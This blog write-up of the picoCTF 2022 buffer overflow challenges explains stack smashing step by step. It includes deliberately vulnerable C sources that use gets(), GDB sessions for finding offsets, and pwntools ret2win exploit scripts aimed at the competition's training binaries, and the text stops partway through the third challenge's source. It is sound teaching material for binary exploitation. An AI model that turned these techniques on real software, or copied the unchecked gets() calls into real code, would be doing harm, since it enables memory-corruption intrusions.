---
title: "PicoCTF 2022: Buffer Overflow series"
date: 2022-06-16 12:16:08
categories:
- ctfs
- pico22
- pwn
tags:
- pwn
- buffer-overflow
description: "Learn how to exploit vulnerable C functions to \"stack-smash\" executables! This is my writeup for the picoCTF 2022 binary/pwn series \"Buffer overflow\"."
short_description: "Obliterating vulnerable C executables, with finesse. This is a tutorial on how to attack processes with \"buffer overflowing.\""
category_column: "pico22/pwn"
permalink: ctfs/pico22/pwn/buffer-overflow-series/
thumbnail: /asset/banner/banner-buffer-overflow.png
alias:
 - ctfs/pico22/crypto/pwn/buffer-overflow-0/
 - ctfs/pico22/crypto/pwn/buffer-overflow-1/
 - ctfs/pico22/crypto/pwn/buffer-overflow-2/
 - ctfs/pico22/crypto/pwn/buffer-overflow-3/
---

![Banner](/asset/pico22/buffer-overflow/banner.svg)

### Intro

This is a writeup for the buffer overflow series during the **picoCTF 2022** competition. This was arguably my favorite set of challenges, as beforehand I'd never stepped into the realm of binary exploitation/pwn. I learned a lot from this, so I highly recommend solving it by yourself before referencing this document. Cheers!

---

{% challenge %}
title: Buffer overflow 0
level: h2
description: |
    Smash the stack! Let's start off simple: can you overflow the correct buffer? The program is available [here](asset/pico22/buffer-overflow/vuln-0). You can view source [here](asset/pico22/buffer-overflow/vuln-0.c), and connect with it using:  
    `nc saturn.picoctf.net 65535`
hints:
  - 1. How can you trigger the flag to print?
  - 2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
  - 3. Run `man gets` and read the BUGS section. How many characters can the program really read?
size: 110%
authors:
  - Alex Fulton
  - Palash Oswal
genre: pwn/binary
solvers: enscribe
points: 100
files: '[vuln](asset/pico22/buffer-overflow/vuln-0), [vuln.c](asset/pico22/buffer-overflow/vuln-0.c)'
{% endchallenge %}

{% ccb caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' html:true terminal:true %}
<span class="meta prompt_">$ </span> checksec vuln
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-0/vuln&apos;
    Arch:     i386-32-little
    RELRO:    <span style="color:#5EBDAB">Full RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#5EBDAB">NX enabled</span>
    PIE:      <span style="color:#5EBDAB">PIE enabled</span>
{% endccb %}

Let's check out our source code:

{% ccb caption:vuln-0.c lang:c url:'enscribe.dev/asset/pico22/buffer-overflow/vuln-0.c' gutter1:1-44 url_text:'download source' scrollable:true %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
{% endccb %}

The first thing we should do is check how the flag is printed. Looks like it's handled in a `sigsegv_handler()` function:

{% ccb lang:c gutter1:10-14,S,31 %}
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);a
  exit(1);
}
/* SKIP_LINE:(15-30) */
signal(SIGSEGV, sigsegv_handler);
{% endccb %}

Researching online, a "SIGSEGV" stands for a **segmentation fault**, which is an error raised by memory-protected hardware whenever it tries to access a memory address that is either restricted or does not exist. If the flag `printf()` resides within `sigsegv_handler()`, then we can safely assume that we must figure out how to trigger a segmentation fault.

We see that on line 40, the horrible `gets()` is called, and reads `buf1` (the user input) onto the stack. This function sucks, as it will write the user's input to the stack without regard to its allocated length. The user can simply overflow this length, and the program will pass their input into the `vuln()` function to trigger a segmentation fault:

{% ccb html:true highlight:3 terminal:true %}
<span class="meta prompt_">$</span> nc saturn.picoctf.net 65535
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_<span style="color:#696969"><b>[REDACTED]</b></span>}
{% endccb %}

---

{% challenge %}
title: Buffer overflow 1
level: h2
description: |
  Control the return address.  
  Now we're cooking! You can overflow the buffer and return to the flag function in the [program](asset/pico22/buffer-overflow/vuln-1). You can view source [here](asset/pico22/buffer-overflow/vuln-1.c). And connect with it using:  
  `nc saturn.picoctf.net [PORT]`
hints:
  - 1. Make sure you consider big Endian vs small Endian.
  - 2. Changing the address of the return pointer can call different functions.
size: 110%
authors:
  - Sanjay C.
  - Palash Oswal
genre: pwn/binary
solvers: enscribe
points: 200
files: '[vuln](asset/pico22/buffer-overflow/vuln-1), [vuln.c](asset/pico22/buffer-overflow/vuln-1.c)'
{% endchallenge %}

{% warning %}
Warning: This is an **instance-based** challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.
{% endwarning %}

{% ccb html:true caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' terminal:true %}
<span class="meta prompt_">$ </span>checksec vuln
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-1/vuln&apos;
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#D41919">NX disabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
    RWX:      <span style="color:#D41919">Has RWX segments</span>
{% endccb %}

Let's check out our source code:

{% ccb caption:vuln-1.c gutter1:1-28,,29-41 lang:c url:'enscribe.dev/asset/pico22/buffer-overflow/vuln-1.c' url_text:'download source' wrapped:true scrollable:true %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
{% endccb %}

In the `vuln()` function, we see that once again, the `gets()` function is being used. However, instead of triggering a segmentation fault like <kbd>Buffer overflow 0</kbd>, we will instead utilize its vulnerability to write our own addresses onto the stack, changing the return address to `win()` instead.

### I: Explaining the Stack 💬

Before we get into the code, we need to figure out how to write our own addresses to the stack. Let's start with a visual:

![Stack Visual](/asset/pico22/buffer-overflow/stack-visual.svg)

Whenever we call a function, multiple items will be "pushed" onto the **top** of the stack (in the diagram, that will be on the right-most side). It will include any parameters, a return address back to `main()`, a base pointer, and a buffer. Note that the stack grows **downwards**, towards lower memory addresses, but the buffer is written **upwards**, towards higher memory addresses.

We can "smash the stack" by exploiting the `gets()` function. If we pass in a large enough input, it will overwrite the entire buffer and start overflowing into the base pointer and return address within the stack:

![Overflow Visual](/asset/pico22/buffer-overflow/overflow-visual.png)

If we are deliberate of the characters we pass into `gets()`, we will be able to insert a new address to overwrite the return address to `win()`. Let's try!

### II: Smashing the Stack 🔨

To start, we first need to figure out our "offset". The offset is the distance, in characters, between the beginning of the buffer and the position of the `$eip`. This can be visualized with the `gdb-gef` utility by setting a breakpoint (a place to pause the runtime) in the `main()` function:

{% ccb html:true terminal:true caption:'GEF - \"GDB enhanced features\"' url:'gef.readthedocs.io/en/master/' url_text:documentation %}
<span style="color:#EC0101"><b>gef➤  </b></span>b main
Breakpoint 1 at <span style="color:#367BF0">0x80492d7</span>
<span style="color:#EC0101"><b>gef➤  </b></span>r
Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
Breakpoint 1, <span style="color:#367BF0">0x080492d7</span> in <span style="color:#FEA44C">main</span> ()
[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>$eax   </b></span>: 0xf7fa39e8  →  <span style="color:#9755B3">0xffffd20c</span>  →  <span style="color:#9755B3">0xffffd3d1</span>  →  <span style="color:#FEA44C">"SHELL=/usr/bin/bash"</span>
<span style="color:#367BF0">$ebx   </span>: 0x0       
<span style="color:#EC0101"><b>$ecx   </b></span>: <span style="color:#9755B3">0xffffd160</span>  →  0x00000001
<span style="color:#EC0101"><b>$edx   </b></span>: <span style="color:#9755B3">0xffffd194</span>  →  0x00000000
<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd140</span>  →  <span style="color:#9755B3">0xffffd160</span>  →  0x00000001
<span style="color:#EC0101"><b>$ebp   </b></span>: <span style="color:#9755B3">0xffffd148</span>  →  0x00000000
<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
<span style="color:#EC0101"><b>$eip   </b></span>: <span style="color:#D41919">0x80492d7</span>  →  <span style="color:#585858"><b>&lt;main+19&gt; sub esp, 0x10</b></span>
<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
   <span style="color:#585858"><b> 0x80492d3 &lt;main+15&gt;        mov    ebp, esp</b></span>
   <span style="color:#585858"><b> 0x80492d5 &lt;main+17&gt;        push   ebx</b></span>
   <span style="color:#585858"><b> 0x80492d6 &lt;main+18&gt;        push   ecx</b></span>
 <span style="color:#5EBDAB">→  0x80492d7 &lt;main+19&gt;        sub    esp, 0x10</span>
    0x80492da &lt;main+22&gt;        call   0x8049130 &lt;__x86.get_pc_thunk.bx&gt;
    0x80492df &lt;main+27&gt;        add    ebx, 0x2d21
    0x80492e5 &lt;main+33&gt;        mov    eax, DWORD PTR [ebx-0x4]
    0x80492eb &lt;main+39&gt;        mov    eax, DWORD PTR [eax]
    0x80492ed &lt;main+41&gt;        push   0x0
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x80492d7</span> in <span style="color:#FF8A18"><b>main</b></span> (), reason: <span style="color:#962AC3"><b>BREAKPOINT</b></span>
{% endccb %}

Analyzing this breakpoint, if we look at the arrow on the assembly code, we can see that its address is the exact same as the `$eip` (`0x80492d7`). Let's try overflowing this register by passing an unhealthy amount of `A`s into the program:

{% ccb html:true terminal:true %}
<pre><span style="color:#47D4B9"><b>gef➤  </b></span>r
Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x41414141

Program received signal SIGSEGV, Segmentation fault.
<span style="color:#367BF0">0x41414141</span> in <span style="color:#FEA44C">??</span> ()
[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>$eax   </b></span>: 0x41      
<span style="color:#EC0101"><b>$ebx   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#EC0101"><b>$ecx   </b></span>: 0x41      
<span style="color:#EC0101"><b>$edx   </b></span>: 0xffffffff
<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd130</span>  →  <span style="color:#FEA44C">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
<span style="color:#EC0101"><b>$ebp   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
<span style="color:#EC0101"><b>$eip   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x41414141
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x41414141</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span>
{% endccb %}

Look what happened: our program threw a SIGSEGV (segmentation) fault, as it is trying to reference the address `0x41414141`, which doesn't exist! This is because our `$eip` was overwritten by all our `A`s (`0x41` in hex = `A` in ASCII).

### III: Finessing the Stack 🛠️

Although we've managed to smash the stack, we still don't know the offset (**how many** `A`s we need to pass in order to reach the `$eip`). To solve this problem, we can use the pwntools `cyclic` command, which creates a string with a recognizable cycling pattern for it to identify:

{% ccb html:true terminal:true %}
<span style="color:#47D4B9"><b>gef➤  </b></span>shell cyclic 48
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
<span style="color:#47D4B9"><b>gef➤  </b></span>r
Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
<span style="color:#367BF0">0x6161616c</span> in <span style="color:#FEA44C">??</span> ()
[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>$eax   </b></span>: 0x41      
<span style="color:#EC0101"><b>$ebx   </b></span>: 0x6161616a (&quot;<span style="color:#FEA44C">jaaa</span>&quot;?)
<span style="color:#EC0101"><b>$ecx   </b></span>: 0x41      
<span style="color:#EC0101"><b>$edx   </b></span>: 0xffffffff
<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd130</span>  →  0x00000000
<span style="color:#EC0101"><b>$ebp   </b></span>: 0x6161616b (&quot;<span style="color:#FEA44C">kaaa</span>&quot;?)
<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
<span style="color:#EC0101"><b>$eip   </b></span>: 0x6161616c (&quot;<span style="color:#FEA44C">laaa</span>&quot;?)
<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x6161616c
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: &quot;vuln&quot;, <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x6161616c</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span>
{% endccb %}

We can see that `$eip` is currently overflowed with the pattern `0x6161616c` (`laaa`). let's search for this pattern using `pattern search`:

{% ccb terminal:true html:true caption:'GEF pattern command' url:'gef.readthedocs.io/en/master/commands/pattern/' url_text:documentation %}
<span style="color:#47D4B9"><b>gef➤  </b></span>pattern search 0x6161616c
<span style="color:#277FFF"><b>[+]</b></span> Searching for &apos;0x6161616c&apos;
<span style="color:#47D4B9"><b>[+]</b></span> Found at offset 44 (little-endian search) <span style="color:#EC0101"><b>likely</b></span>
<span style="color:#47D4B9"><b>[+]</b></span> Found at offset 41 (big-endian search) 
{% endccb %}

To figure out which offset we need to use, we can use `readelf` to analyze header of the `vuln` executable:

{% ccb terminal:true html:true caption:'readelf command' url:'man7.org/linux/man-pages/man1/readelf.1.html' url_text:documentation %}
<span class="line"><span class="meta prompt_">$ </span><span class="language-bash">readelf -h vuln | grep endian</span></span><br><span class="line">  Data: 2&#x27;s complement, little endian</span>
{% endccb %}

Our binary is in little endian, we know that 44 `A`s are needed in order to reach the `$eip`. The only thing we need now before we create our exploit is the address of the `win()` function, which will be appended to the end of our buffer to overwrite the `$eip` on the stack:

{% ccb terminal:true html:true caption:'GDB x command' url:'visualgdb.com/gdbreference/commands/x' url_text:documentation %}
<span style="color:#47D4B9"><b>gef➤  </b></span>x win
<span style="color:#367BF0">0x80491f6</span> &lt;<span style="color:#FEA44C">win</span>&gt;:	0xfb1e0ff3
{% endccb %}

Win is at `0x80491f6`, but we need to convert it to the little endian format. You can do this with the pwntools `p32()` command, which results in `\xf6\x91\x04\x08`.
Let's make a final visual of our payload:

![Payload Visual](asset/pico22/buffer-overflow/payload-visual.png)

Let's write our payload and send it to the remote server with Python3/pwntools:

{% ccb lang:py caption:buffer-overflow-1.py gutter1:1-11 url:'gist.github.com/jktrn/23ec53b007e3589c6793acffce207394' url_text:'github gist link' %}
#!/usr/bin/env python3
from pwn import *

payload = b"A"*44 + p32(0x80491f6)  # Little endian: b'\xf6\x91\x04\x08'
host, port = "saturn.picoctf.net", [PORT]

p = remote(host, port)      # Opens the connection
log.info(p.recvS())         # Decodes/prints "Please enter your string:"
p.sendline(payload)         # Sends the payload
log.success(p.recvallS())   # Decodes/prints all program outputs
p.close()                   # Closes the connection
{% endccb %}

Let's try running the script on the server:

{% ccb terminal:true html:true %}
<span class="meta prompt_">$ </span>python3 buffer-overflow-1.py
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
[<span style="color:#277FFF"><b>*</b></span>] Please enter your string: 
[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (100B)
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to saturn.picoctf.net port <span style="color:#696969"><b>[PORT]</b></span>
[<span style="color:#47D4B9"><b>+</b></span>] Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
    picoCTF{addr3ss3s_ar3_3asy_<span style="color:#696969"><b>[REDACTED]</b></span>}
{% endccb %}

We have completed our first `ret2win` buffer overflow on a x32 binary! Yet, this is just the beginning. How about we spice things up a little bit?

### IV: Automating the Stack 🔧

Although the concept of buffer overflows can seem daunting to newcomers, experienced pwners will often find these sorts of challenges trivial, and don't want to spend the effort manually finding offsets and addresses just to send the same type of payload. This is where our best friend comes in: **pwntools** helper functions and automation! Let's start with the first part - the `$eip` offset for x32 binaries.

The main helper we will be using is [`pwnlib.elf.corefile`](https://docs.pwntools.com/en/stable/elf/corefile). It can parse [core dump](https://www.ibm.com/docs/en/aix/7.1?topic=formats-core-file-format) files, which are generated by Linux whenever errors occur during a running process. These files take an **image** of the process when the error occurs, which may assist the user in the debugging process. Remember when we sent a large `cyclic` pattern which was used to cause a segmentation fault? We'll be using the core dump to view the state of the registers during that period, without needing to step through it using GDB. We'll be using the coredump to eventually find the offset!

{% info %}
Info: Many Linux systems do not have core dumps properly configured. For bash, run `ulimit -c unlimited` to generate core dumps of unlimited size. For tsch, run `limit coredumpsize unlimited`. By default, cores are dumped into either the current directory or `/var/lib/systemd/coredump`.
{% endinfo %}

Before we start, let's work through the steps with command-line Python. First, let's import the pwntools global namespace and generate an `elf` object using pwntool's `ELF()`:

{% ccb terminal:true html:true %}
<span class="line"><span class="meta prompt_">$ </span>python3 -q</span><br><span class="meta prompt_">>>></span> from pwn import *
<span class="meta prompt_">>>></span> elf = context.binary = ELF('./vuln')
[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/vuln'
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#D41919">NX disabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
    RWX:      <span style="color:#D41919">Has RWX segments</span>
{% endccb %}

We can then generate a `cyclic()` payload and start a local process referencing the aforementioned `elf` object. Sending the payload and using the [`.wait()`](https://www.educba.com/python-wait/) method will throw an exit code -11, which signals a segmentation fault and generates a core dump. 

{% ccb terminal:true html:true wrapped:true %}
<span class="meta prompt_">>>></span> p = process(elf.path)
[<span style="color:#9755B3">x</span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln'
[<span style="color:#47D4B9"><b>+</b></span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln': pid 2219
<span class="meta prompt_">>>></span> p.sendline(cyclic(128))
<span class="meta prompt_">>>></span> p.wait()
[<span style="color:#277FFF"><b>*</b></span>] Process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 2219)
<span class="meta prompt_">>>></span> exit()
<span class="meta prompt_">$ </span>ls -al
total 2304
drwxr-xr-x  3 kali kali    4096 Jun 16 15:35 <span style="color:#277FFF"><b>.</b></span>
drwxr-xr-x 16 kali kali    4096 Jun 14 17:13 <span style="color:#277FFF"><b>..</b></span>
-rw-------  1 kali kali 2588672 Jun 16 15:35 core
-rw-r--r--  1 kali kali     358 Jun 16 03:22 buffer-overflow-1.py
-rwxr-xr-x  1 kali kali   15704 Mar 15 02:45 <span style="color:#47D4B9"><b>vuln</b></span>
-rw-r--r--  1 kali kali     769 Mar 15 02:45 vuln.c
{% endccb %}

We can now create a corefile object and freely reference registers! To find the offset, we can simply call the object key within `cyclic_find()`.

{% ccb terminal:true html:true wrapped:true %}
<span class="meta prompt_">>>></span> core = Corefile('./core')
[<span style="color:#9755B3">x</span>] Parsing corefile...
[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/core'
    Arch:      i386-32-little
    EIP:       0x6161616c
    ESP:       0xff93abe0
    Exe:       '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' (0x8048000)
    Fault:     0x6161616c
[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
<span class="meta prompt_">>>></span> core.registers
{'eax': 65, 'ebp': 1633771883, 'ebx': 1633771882, 'ecx': 65, 'edi': 134516960, 'edx': 4294967295, 'eflags': 66178, 'eip': 1633771884, 'esi': 1, 'esp': 4287867872, 'orig_eax': 4294967295, 'xcs': 35, 'xds': 43, 'xes': 43, 'xfs': 0, 'xgs': 99, 'xss': 43}
<span class="meta prompt_">>>></span> hex(core.eip)
'0x6161616c'
{% endccb %}

Now that we know how ELF objects and core dumps work, let's apply them to our previous script. Another cool helper I would like to implement is [`flat()`](https://docs.pwntools.com/en/stable/util/packing.html) (which has a great tutorial [here](https://www.youtube.com/watch?v=AMDbbuLaXfk), referred to by the legacy alias `fit()`), which flattens arguments given in lists, tuples, or dictionaries into a string with `pack()`. This will help us assemble our payload without needing to concatenate seemingly random strings of `A`s and little-endian addresses, increasing readability.

This is my final, completely automated script:

{% ccb lang:py gutter1:1-22 caption:buffer-overflow-1-automated.py url:'gist.github.com/jktrn/b1586f403c6ae31ce0e128b8f96faad6' url_text:'github gist link' %}
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)    # sets elf object
host, port = 'saturn.picoctf.net', [PORT]

p = process(elf.path)        # references elf object
p.sendline(cyclic(128))      # sends cyclic pattern to crash
p.wait()                     # sigsegv generates core dump
core = Coredump('./core')    # parse core dump file

payload = flat({
    cyclic_find(core.eip): elf.symbols.win    # offset:address
})

if args.REMOTE:    # remote process if arg
    p = remote(host, port)
else:
    p = process(elf.path)

p.sendline(payload)
p.interactive()    # receives flag
{% endccb %}

Let's run the script on the server:

{% ccb html:true wrapped:true terminal:true %}
<span class="meta prompt_">$ </span>python3 buffer-overflow-1-automated.py REMOTE
[<span style="color:#47D4B9"><b>+</b></span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln': pid 2601
[<span style="color:#277FFF"><b>*</b></span>] Process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 2601)
[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/core'
    Arch:      i386-32-little
    EIP:       0x6161616c
    ESP:       0xff829260
    Exe:       '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' (0x8048000)
    Fault:     0x6161616c
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_<span style="color:#696969"><b>[REDACTED]</b></span>}[<span style="color:#277FFF"><b>*</b></span>] Got EOF while reading in interactive
{% endccb %}

We've successfully automated a solve on a simple x32 buffer overflow!

---

{% challenge %}
title: Buffer overflow 2
level: h2
description: |
  Control the return address and arguments.  
  This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](asset/pico22/buffer-overflow/vuln-2)?  
  You can view source [here](asset/pico22/buffer-overflow/vuln-2.c). And connect with it using:  
  `nc saturn.picoctf.net [PORT]`
hints:
  - 1. Try using GDB to print out the stack once you write to it.
size: 105%
authors:
  - Sanjay C.
  - Palash Oswal
genre: pwn/binary
solvers: enscribe
points: 300
files: '[vuln](asset/pico22/buffer-overflow/vuln-2), [vuln.c](asset/pico22/buffer-overflow/vuln-2.c)'
{% endchallenge %}

{% warning %}
Warning: This is an **instance-based** challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.
{% endwarning %}

{% ccb caption:checksec.sh url:github.com/slimm609/checksec.sh url_text:'github link' html:true terminal:true %}
<span class="meta prompt_">$ </span>checksec vuln
[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#D41919">No canary found</span>
    NX:       <span style="color:#5EBDAB">NX enabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
{% endccb %}

Let's check out our source code:

{% ccb caption:vuln-2.c lang:c gutter1:1-43 url:'enscribe.dev/asset/pico22/buffer-overflow/vuln-2.c' url_text:'download source' scrollable:true %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
